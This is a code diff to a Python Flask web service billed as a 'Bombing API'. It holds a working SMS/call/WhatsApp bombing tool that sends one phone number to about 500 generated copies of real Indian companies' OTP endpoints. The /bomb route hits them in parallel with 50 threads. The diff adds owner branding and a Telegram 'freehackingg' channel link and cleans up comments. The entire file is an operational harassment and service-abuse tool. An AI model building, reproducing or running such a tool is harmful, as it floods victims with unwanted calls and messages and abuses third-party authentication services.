@@ -4,19 +4,20 @@ import json
 import re
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
-import random
 
 app = Flask(__name__)
 
+# ========== OWNER / DEVELOPER INFO ==========
 OWNER = "@notxsatvir"
+DEVELOPER = "@notxsatvir"
+CHANNEL = "https://t.me/freehackingg"
 API_VERSION = "6.0.0"
 
-# ========== 500+ APIs GENERATOR (कोड में ही लूप से बनेंगी) ==========
+# ========== 500+ APIs GENERATOR ==========
 def generate_apis():
-    """Programmatically generate 500+ unique API configurations"""
     apis = []
-    
-    # ----- Call API Templates -----
+
+    # Call API Templates
     call_templates = [
         ("Tata Capital Voice", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", {"phone": "{phone}"}),
         ("1MG Voice", "https://www.1mg.com/auth_api/v6/create_token", {"number": "{phone}", "otp_on_call": True}),
@@ -29,8 +30,8 @@ def generate_apis():
         ("Amazon Voice", "https://www.amazon.in/ap/voice-otp", {"phoneNumber": "{phone}"}),
         ("Ola Voice", "https://auth.olacabs.com/api/v1/voice-otp", {"mobile": "{phone}"}),
     ]
-    
-    # ----- SMS API Templates (बहुत सारे) -----
+
+    # SMS API Templates
     sms_templates = [
         ("Lenskart", "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", {"phoneCode": "+91", "telephone": "{phone}"}),
         ("PharmEasy", "https://pharmeasy.in/api/v2/auth/send-otp", {"phone": "{phone}"}),
@@ -76,21 +77,17 @@ def generate_apis():
         ("Ajio", "https://www.ajio.com/api/v1/auth/otp", {"mobile": "{phone}"}),
         ("Nykaa", "https://www.nykaa.com/api/v1/auth/otp", {"phone": "{phone}"}),
         ("Purplle", "https://www.purplle.com/api/v1/auth/otp", {"mobile": "{phone}"}),
-        # और भी डाल सकते हो – बस template बढ़ाओ
     ]
-    
-    # ----- WhatsApp Templates -----
+
+    # WhatsApp Templates
     whatsapp_templates = [
         ("KPN WhatsApp", "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{phone}"}}),
         ("Rappi WhatsApp", "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", {"country_code": "+91", "phone": "{phone}"}),
         ("Eka Care WhatsApp", "https://auth.eka.care/auth/init", {"payload": {"allowWhatsapp": True, "mobile": "+91{phone}"}, "type": "mobile"}),
     ]
-    
-    # अब हर template को अलग-अलग parameters के साथ कई बार इस्तेमाल करके 500+ बनाएँगे
-    # हम suffixes और random tweaks डालेंगे ताकी API नाम unique रहें
-    
-    # Calls
-    for i in range(25):  # 10 * 25 = 250 calls
+
+    # Generate Call APIs (250)
+    for i in range(25):
         for name, url, data in call_templates:
             final_name = f"{name}_v{i}" if i > 0 else name
             apis.append({
@@ -101,9 +98,9 @@ def generate_apis():
                 "headers": {"Content-Type": "application/json"},
                 "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
             })
-    
-    # SMS (let's generate 250 sms)
-    for i in range(5):  # 50 templates * 5 = 250 SMS
+
+    # Generate SMS APIs (250)
+    for i in range(5):
         for name, url, data in sms_templates:
             final_name = f"{name}_SMS{i}" if i > 0 else name
             apis.append({
@@ -114,8 +111,8 @@ def generate_apis():
                 "headers": {"Content-Type": "application/json"},
                 "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
             })
-    
-    # WhatsApp (generate 50+)
+
+    # Generate WhatsApp APIs (50+)
     for i in range(20):
         for name, url, data in whatsapp_templates:
             final_name = f"{name}_v{i}" if i > 0 else name
@@ -127,10 +124,7 @@ def generate_apis():
                 "headers": {"Content-Type": "application/json"},
                 "data": lambda phone, d=data: json.dumps(d).replace("{phone}", phone)
             })
-    
-    # Duplicates remove? We'll keep all, names are unique due to i
-    # But ensure lambda doesn't capture loop variable issue – we use default parameter trick
-    # Actually above lambda uses default argument to capture d properly, but it's inside loop – works because each iteration creates new lambda with its own d.
+
     return apis
 
 APIS = generate_apis()
@@ -139,12 +133,12 @@ print(f"✅ Loaded {TOTAL_APIS} APIs")
 
 def hit_api(api, phone):
     try:
-        data_str = api["data"](phone)  # Now returns JSON string
+        data_str = api["data"](phone)
         data_dict = json.loads(data_str)
         resp = requests.post(api["url"], headers=api["headers"], json=data_dict, timeout=4)
         if resp.status_code in [200, 201, 202, 204]:
             return api["type"], True
-    except:
+    except Exception:
         pass
     return api["type"], False
 
@@ -154,6 +148,9 @@ def home():
         "success": True,
         "api": "Bombing API (500+ APIs)",
         "owner": OWNER,
+        "developer": DEVELOPER,
+        "channel": CHANNEL,
+        "version": API_VERSION,
         "total_apis": TOTAL_APIS,
         "endpoint": "/bomb?number=9876543210"
     })
@@ -163,7 +160,7 @@ def bomb():
     number = request.args.get('number')
     if not number or not re.match(r'^[6-9]\d{9}$', number):
         return jsonify({"error": "Valid 10-digit number required"}), 400
-    
+
     stats = {"Call": 0, "SMS": 0, "WhatsApp": 0}
     with ThreadPoolExecutor(max_workers=50) as executor:
         futures = [executor.submit(hit_api, api, number) for api in APIS]
@@ -171,10 +168,12 @@ def bomb():
             typ, success = future.result()
             if success:
                 stats[typ] += 1
-    
+
     return jsonify({
         "success": True,
         "owner": OWNER,
+        "developer": DEVELOPER,
+        "channel": CHANNEL,
         "number": number,
         "total_apis_attempted": TOTAL_APIS,
         "successful_hits": sum(stats.values()),
